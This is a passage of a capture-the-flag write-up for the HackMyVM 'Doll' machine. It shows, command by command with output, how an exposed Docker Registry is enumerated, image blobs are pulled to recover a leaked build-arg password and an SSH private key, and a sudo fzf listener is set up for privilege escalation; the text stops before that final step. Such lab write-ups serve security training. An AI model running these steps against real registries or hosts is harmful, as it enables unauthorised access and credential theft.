# CTF Penetration Testing

## HackMyVM

### Doll - Machine

#### Machine Description

- Machine name: [Doll](https://hackmyvm.eu/machines/machine.php?vm=Doll)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/ez.png" alt="Doll Machine Logo" width="150"/>

#### Machine Writeup

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.125 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.125`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-25 09:39 EDT
Nmap scan report for 192.168.56.125
Host is up (0.00076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) ←
1007/tcp open  http    Docker Registry (API: 2.0) ←
MAC Address: 08:00:27:96:59:4F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.29 seconds
```

`curl http://192.168.56.125:1007 -v`:
```
*   Trying 192.168.56.125:1007...
* Connected to 192.168.56.125 (192.168.56.125) port 1007
> GET / HTTP/1.1
> Host: 192.168.56.125:1007
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK ←
< Cache-Control: no-cache
< Date: Wed, 25 Sep 2024 13:49:48 GMT
< Content-Length: 0
< 
* Connection #0 to host 192.168.56.125 left intact
```

`gobuster dir -u http://192.168.56.125:1007 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 100`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.125:1007
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   401,404,500,400
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,txt,zip,html,php,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/v2                   (Status: 301) [Size: 39] [--> /v2/] ←

[...]
```

<div>
	<img src="assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[Pentesting Docker Registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)

**#Discovering**
The easiest way to discover this service running is get it on the output of nmap. Anyway, note that as it's a HTTP based service it can be behind HTTP proxies and nmap won't detect it. Some fingerprints:
- If you access `/` nothing is returned in the response
- If you access `/v2/` then `{}` is returned
- If you access `/v2/_catalog` you may obtain:
    - `{"repositories":["alpine","ubuntu"]}`
    - `{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}`

`curl http://192.168.56.125:1007/v2/ -v`:
```
*   Trying 192.168.56.125:1007...
* Connected to 192.168.56.125 (192.168.56.125) port 1007
> GET /v2/ HTTP/1.1
> Host: 192.168.56.125:1007
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK ←
< Content-Length: 2
< Content-Type: application/json; charset=utf-8
< Docker-Distribution-Api-Version: registry/2.0
< X-Content-Type-Options: nosniff
< Date: Thu, 26 Sep 2024 07:35:28 GMT
< 
* Connection #0 to host 192.168.56.125 left intact
{}
```

`curl -s http://192.168.56.125:1007/v2/_catalog`:
```json
{"repositories":["dolly"]}
```

`curl -s http://192.168.56.125:1007/v2/dolly/tags/list`:
```json
{"name":"dolly","tags":["latest"]}
```

`curl -s http://192.168.56.125:1007/v2/dolly/manifests/latest`:
```json
{
   "schemaVersion": 1,
   "name": "dolly",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\",\"container_config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2023-04-25T08:58:11.460540528Z\",\"docker_version\":\"23.0.4\",\"id\":\"89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\",\"os\":\"linux\",\"parent\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\",\"parent\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"ARG passwd=devilcollectsit\"]},\"throwaway\":true}" ←
      },
      {
         "v1Compatibility": "{\"id\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"parent\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.348438709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "KPVQ:BHUT:4PJI:NZE4:FOK4:4YRS:DQ3P:EXQ6:OXFA:NKKD:ZKCX:XED4",
               "kty": "EC",
               "x": "etq2QxeYVLtL4rqdIDxNUQ-0w3W9r-wnljodLZD_5-Q",
               "y": "xS7u7lnBM8EXA6PmKMzA06kkrGrIaOvpZAqIVyELnaI"
            },
            "alg": "ES256"
         },
         "signature": "Ut2WxgTq8VRF2xa2od5VUGqW688nPTxir3TTOYOCTaDE5JJ0fKN9Y5fHh1WHpPNuNi9vRTgBMcC78XaO2jW4AA",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNC0wOS0yNlQwNzozODowMVoifQ"
      }
   ]
}
```

`mkdir ./blobs`
`cd ./blobs`

`wget http://192.168.56.125:1007/v2/dolly/manifests/latest`:
```
--2024-09-26 04:02:03--  http://192.168.56.125:1007/v2/dolly/manifests/latest
Connecting to 192.168.56.125:1007... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3476 (3.4K) [application/vnd.docker.distribution.manifest.v1+prettyjws]
Saving to: ‘latest’

latest                                         100%[====================================================================================================>]   3.39K  --.-KB/s    in 0s      

2024-09-26 04:02:03 (190 MB/s) - ‘latest’ saved [3476/3476] ←
```

`cat ./latest | grep 'blobSum' | awk '{print $2}' | tr -d '"'`:
```
sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09
```

`for item in $(cat ./latest | grep 'blobSum' | awk '{print $2}' | tr -d '"'); do wget http://192.168.56.125:1007/v2/dolly/blobs/$item; done`:
```
--2024-09-26 04:08:56--  http://192.168.56.125:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017
Connecting to 192.168.56.125:1007... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3707 (3.6K) [application/octet-stream]
Saving to: ‘sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017’

sha256:5f8746267271592fd43ed8a2c03cee11a14f287 100%[====================================================================================================>]   3.62K  --.-KB/s    in 0.001s  

2024-09-26 04:08:56 (2.39 MB/s) - ‘sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017’ saved [3707/3707]

--2024-09-26 04:08:56--  http://192.168.56.125:1007/v2/dolly/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
Connecting to 192.168.56.125:1007... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32 [application/octet-stream]
Saving to: ‘sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4’

sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633 100%[====================================================================================================>]      32  --.-KB/s    in 0s      

2024-09-26 04:08:56 (5.22 MB/s) - ‘sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4’ saved [32/32]

--2024-09-26 04:08:56--  http://192.168.56.125:1007/v2/dolly/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
Connecting to 192.168.56.125:1007... connected.
HTTP request sent, awaiting response... 200 OK
Length: 32 [application/octet-stream]
Saving to: ‘sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.1’

sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633 100%[====================================================================================================>]      32  --.-KB/s    in 0s      

2024-09-26 04:08:56 (4.50 MB/s) - ‘sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.1’ saved [32/32]

--2024-09-26 04:08:56--  http://192.168.56.125:1007/v2/dolly/blobs/sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09
Connecting to 192.168.56.125:1007... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3374563 (3.2M) [application/octet-stream]
Saving to: ‘sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09’

sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd 100%[====================================================================================================>]   3.22M  --.-KB/s    in 0.1s    

2024-09-26 04:08:56 (29.8 MB/s) - ‘sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09’ saved [3374563/3374563]
```

`for file in sha256:*; do new_name="${file/sha256:/}"; mv "$file" "$new_name.gz"; done`

`ls -alps ./`:
```
total 3320
   4 drwxrwxr-x  2 kali kali    4096 Sep 26 04:27 ./
   4 drwx------ 29 kali kali    4096 Sep 26 04:24 ../
   4 -rw-rw-r--  1 kali kali    3707 Sep 26 04:27 5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017.gz
   4 -rw-rw-r--  1 kali kali      32 Sep 26 04:27 a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.1.gz
   4 -rw-rw-r--  1 kali kali      32 Sep 26 04:27 a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.gz
3296 -rw-rw-r--  1 kali kali 3374563 Sep 26 04:27 f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09.gz
   4 -rw-rw-r--  1 kali kali    3476 Sep 26 04:02 latest
```
`rm ./a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.1.gz`
`rm ./latest`

`file *`:
```                                          
5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017.gz: gzip compressed data, original size modulo 2^32 19456
a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.gz: gzip compressed data, original size modulo 2^32 1024
f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09.gz: gzip compressed data, original size modulo 2^32 7337984
```

`for file in *.gz; do gunzip "$file"; done`

`file *`:
```
5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017: POSIX tar archive
a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4: data
f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09: POSIX tar archive
```

`vim ./extract_tar_archives.sh`:
```sh                 
for file in *; do 
    if file "$file" | grep -q 'POSIX tar archive'; then 
        folder_name="${file%.*}_dir"  # Create a folder name with a "_dir" suffix
        mkdir -p "$folder_name"  # Create the folder
        tar -xvf "$file" -C "$folder_name" # Extract into the corresponding folder
    fi 
done
```
`chmod +x ./extract_tar_archives.sh`
`./extract_tar_archives.sh`

`ls -alps ./`:
```
total 7212
   4 drwxrwxr-x  4 kali kali    4096 Sep 26 04:55 ./
   4 drwx------ 29 kali kali    4096 Sep 26 04:55 ../
  20 -rw-rw-r--  1 kali kali   19456 Sep 26 04:27 5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017
   4 drwxrwxr-x  5 kali kali    4096 Sep 26 04:55 5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/ ←
   4 -rw-rw-r--  1 kali kali    1024 Sep 26 04:27 a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
   4 -rwxrwxr-x  1 kali kali     308 Sep 26 04:55 extract_tar_archives.sh
7168 -rw-rw-r--  1 kali kali 7337984 Sep 26 04:27 f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09
   4 drwxrwxr-x 19 kali kali    4096 Sep 26 04:55 f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09_dir/ ←
```

`ls -alps *_dir`:
```                  
5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir:
total 20
4 drwxrwxr-x 5 kali kali 4096 Sep 26 04:55 ./
4 drwxrwxr-x 4 kali kali 4096 Sep 26 04:55 ../
4 drwxr-xr-x 2 kali kali 4096 Apr 25  2023 etc/
4 drwxr-xr-x 3 kali kali 4096 Apr 25  2023 home/
4 drwx------ 2 kali kali 4096 Apr 25  2023 root/

f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09_dir:
total 76
4 drwxrwxr-x 19 kali kali 4096 Sep 26 04:55 ./
4 drwxrwxr-x  4 kali kali 4096 Sep 26 04:55 ../
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 bin/
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 dev/
4 drwxr-xr-x 17 kali kali 4096 Mar 29  2023 etc/
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 home/
4 drwxr-xr-x  7 kali kali 4096 Mar 29  2023 lib/
4 drwxr-xr-x  5 kali kali 4096 Mar 29  2023 media/
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 mnt/
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 opt/
4 dr-xr-xr-x  2 kali kali 4096 Mar 29  2023 proc/
4 drwx------  2 kali kali 4096 Mar 29  2023 root/
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 run/
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 sbin/
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 srv/
4 drwxr-xr-x  2 kali kali 4096 Mar 29  2023 sys/
4 drwxrwxr-x  2 kali kali 4096 Mar 29  2023 tmp/
4 drwxr-xr-x  7 kali kali 4096 Mar 29  2023 usr/
4 drwxr-xr-x 12 kali kali 4096 Mar 29  2023 var/
```

`ls -alps ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home`:
```
total 12
4 drwxr-xr-x 3 kali kali 4096 Apr 25  2023 ./
4 drwxrwxr-x 5 kali kali 4096 Sep 26 04:55 ../
4 drwxr-xr-x 3 kali kali 4096 Apr 25  2023 bela/ ←
```
`ls -alps ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/`:
```
total 16
4 drwxr-xr-x 3 kali kali 4096 Apr 25  2023 ./
4 drwxr-xr-x 3 kali kali 4096 Apr 25  2023 ../
4 -rw------- 1 kali kali   57 Apr 25  2023 .ash_history
4 drwxr-xr-x 2 kali kali 4096 Apr 25  2023 .ssh/ ←
0 -rwxr-xr-x 1 kali kali    0 Dec 31  1969 .wh..wh..opq
```
`ls -alps ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh`:
```        
total 12
4 drwxr-xr-x 2 kali kali 4096 Apr 25  2023 ./
4 drwxr-xr-x 3 kali kali 4096 Apr 25  2023 ../
4 -rw-r--r-- 1 kali kali 2635 Apr 25  2023 id_rsa ←
```
`chmod 600 ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh/id_rsa`

`ssh -i ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh/id_rsa bela@192.168.56.125`:
```
Enter passphrase for key '5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh/id_rsa': ←
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Sep 26 11:09:06 2024 from 192.168.56.118
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>bela</code> }</b></span>

`whoami`:
```
bela ←
```

`id`:
```
uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

`uname -a`:
```
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 11 (bullseye)
Release:        11
Codename:       bullseye
```

`cd /home/bela`
`ls -alps ./`:
```
total 36
4 drwxr-xr-x 4 bela bela 4096 abr 25  2023 ./
4 drwxr-xr-x 3 root root 4096 abr 25  2023 ../
0 lrwxrwxrwx 1 bela bela    9 abr 25  2023 .bash_history -> /dev/null
4 -rw-r--r-- 1 bela bela  220 abr 25  2023 .bash_logout
4 -rw-r--r-- 1 bela bela 3526 abr 25  2023 .bashrc
4 drwxr-xr-x 3 bela bela 4096 abr 25  2023 .local/
4 -rw-r--r-- 1 bela bela  807 abr 25  2023 .profile
4 drwx------ 2 bela bela 4096 abr 25  2023 .ssh/
4 -rw------- 1 bela bela   19 abr 25  2023 user.txt ←
4 -rw------- 1 bela bela   50 abr 25  2023 .Xauthority
```

`cat ./user.txt`:
```
juHDnnGMYNIkVgfnMV ←
```

`sudo -l`:
```
Matching Defaults entries for bela on doll:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bela may run the following commands on doll:
    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337 ←
```

`netstat -antp`:
```
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:1007            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.56.125:22       192.168.56.118:50530    ESTABLISHED -                   
tcp6       0      0 :::1007                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

`exit`

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`ssh -i ./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh/id_rsa bela@192.168.56.125 -L 8888:127.0.0.1:1337`:
```
Enter passphrase for key './5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017_dir/home/bela/.ssh/id_rsa': ←
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Sep 26 11:09:17 2024 from 192.168.56.118
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>bela</code> }</b></span>

`sudo /usr/bin/fzf --listen\=1337 &`:
```
[1] 1006
```

`netstat -antp | grep ":1337"`:
```
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1337 ←         0.0.0.0:*               LISTEN      -
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`lsof -i ":8888"`:
```
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     59563 kali    4u  IPv6 126171      0t0  TCP localhost:8888 (LISTEN)
ssh     59563 kali    5u  IPv4 126172      0t0  TCP localhost:8888 (LISTEN)
```

`netstat -antp | grep ":8888"`:
```
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      59563/ssh           
tcp6       0      0 ::1:8888                :::*                    LISTEN      59563/ssh 
```

`nmap -Pn -sSV -p8888 localhost`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 05:28 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000058s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE         VERSION
8888/tcp open  sun-answerbook? ←
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.94SVN%I=7%D=9/26%Time=66F52958%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,47,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x
SF:2023\r\n\r\ninvalid\x20request\x20method\n")%r(HTTPOptions,47,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Length:\x2023\r\n\r\ninvalid\x20r
SF:equest\x20method\n")%r(FourOhFourRequest,47,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x2023\r\n\r\ninvalid\x20request\x20method\n
SF:")%r(JavaRMI,47,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\
SF:x2023\r\n\r\ninvalid\x20request\x20method\n")%r(LSCP,47,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Length:\x2023\r\n\r\ninvalid\x20request
SF:\x20method\n")%r(GenericLines,47,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Length:\x2023\r\n\r\ninvalid\x20request\x20method\n")%r(RTSPRe
SF:quest,47,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2023\r
SF:\n\r\ninvalid\x20request\x20method\n")%r(RPCCheck,47,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Length:\x2023\r\n\r\ninvalid\x20request\x2
SF:0method\n")%r(DNSVersionBindReqTCP,47,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Length:\x2023\r\n\r\ninvalid\x20request\x20method\n")%r(D
SF:NSStatusRequestTCP,47,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Le
SF:ngth:\x2023\r\n\r\ninvalid\x20request\x20method\n")%r(Help,47,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Length:\x2023\r\n\r\ninvalid\x20r
SF:equest\x20method\n")%r(SSLSessionReq,47,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Length:\x2023\r\n\r\ninvalid\x20request\x20method\n")%r
SF:(TerminalServerCookie,47,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Length:\x2023\r\n\r\ninvalid\x20request\x20method\n")%r(TLSSessionReq,
SF:47,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2023\r\n\r\n
SF:invalid\x20request\x20method\n")%r(Kerberos,47,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Length:\x2023\r\n\r\ninvalid\x20request\x20metho
SF:d\n")%r(SMBProgNeg,47,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Le
SF:ngth:\x2023\r\n\r\ninvalid\x20request\x20method\n")%r(X11Probe,47,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2023\r\n\r\ninvalid\
SF:x20request\x20method\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds
```

`curl http://localhost:8888/ -v`:
```
* Host localhost:8888 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:8888...
* Connected to localhost (::1) port 8888
> GET / HTTP/1.1
> Host: localhost:8888
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 400 Bad Request
< Content-Length: 23
< 
invalid request method ←
* Connection #0 to host localhost left intact
```

`curl http://localhost:8888/ -d 'TEST'`:
```
unknown action: TEST ←
```

<div>
	<img src="assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[fzf](https://github.com/junegunn/fzf?tab=readme-ov-file#executing-external-programs)

**#Executing external programs**
You can set up key bindings for starting external processes without leaving fzf (`execute`, `execute-silent`).
```shell
# Press F1 to open the file with less without leaving fzf
